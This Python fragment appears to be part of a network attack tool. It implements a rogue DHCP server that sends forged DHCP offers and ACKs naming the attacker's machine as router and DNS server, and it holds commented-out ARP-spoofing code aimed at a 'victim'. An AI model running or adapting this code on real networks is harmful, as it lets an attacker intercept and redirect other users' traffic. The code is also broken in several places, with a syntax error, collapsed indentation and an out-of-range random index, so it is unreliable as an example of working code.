import util
import threading
from netaddr import *
import netifaces
import random

spoofed_hosts = []


def dhcp_handler(self, pkt):
	if pkt.haslayer(DHCP):
		requested_addr = None
		gateway = config.netspecs.get_gateway()
		curr_ip = None
		opt = pkt[DHCP].options:
		# if the option is a REQUEST
		if type(opt) is tuple and len(opt) > 1 and opt[1] == 3:
			if opt[0] == 'requested_addr':
				requested_addr = opt[1]
			if not requested_addr in spoofed_hosts: curr_ip = requested_addr
			else: curr_ip = config.ipnetwork[random.randint(0,len(config.ipnetwork))]
			lease = Ether(dst='ff:ff:ff:ff:ff:ff', src=config.netspecs.get_mac())
			lease /= IP(src=gateway, dst='255.255.255.255')
			lease /= UDP(sport=67, dport=68)
			lease /= BOOTP(op=2, chaddr=mac2str(pkt[Ether].src),
			yiaddr= curr_ip, xid=pkt[BOOTP].xid)
			lease /= DHCP(options=[('message-type', 'ack'),
			('server_id', gateway),
			('lease_time', 86400),
			('subnet_mask', '255.255.255.0'),
			('router', gateway),
			('name_server', gateway),
			'end'])
			sendp(lease, loop=False)

			#tmp = arp()
			#victim = (self.curr_ip, getmacbyip(self.curr_ip))
			#target = (gateway, hw)
			#tmp.victim = victim
			#tmp.target = target
			#if not tmp.initialize_post_spoof() is None:
			#self.spoofed_hosts[self.curr_ip] = tmp

			# discover; send offer
		elif type(opt) is tuple and len(opt) > 1 and opt[1] == 1:
		if curr_ip is None:
			curr_ip = config.ipnetwork[random.randint(0,len(config.ipnetwork))]
		# build and send the DHCP Offer
		offer = Ether(dst='ff:ff:ff:ff:ff:ff', src=config.netspecs.get_gateway())
		offer /= IP(src=gateway, dst='255.255.255.255')
		offer /= UDP(sport=67, dport=68)
		offer /= BOOTP(op=2, chaddr=mac2str(pkt[Ether].src),
		yiaddr=curr_ip, xid=pkt[BOOTP].xid)
		offer /= DHCP(options=[('message-type', 'offer'),
		('subnet_mask', '255.255.255.0'),
		('lease_time', 86400),
		('name_server', gateway),
		('router', gateway),
		'end'])
		sendp(offer, loop=False)
	
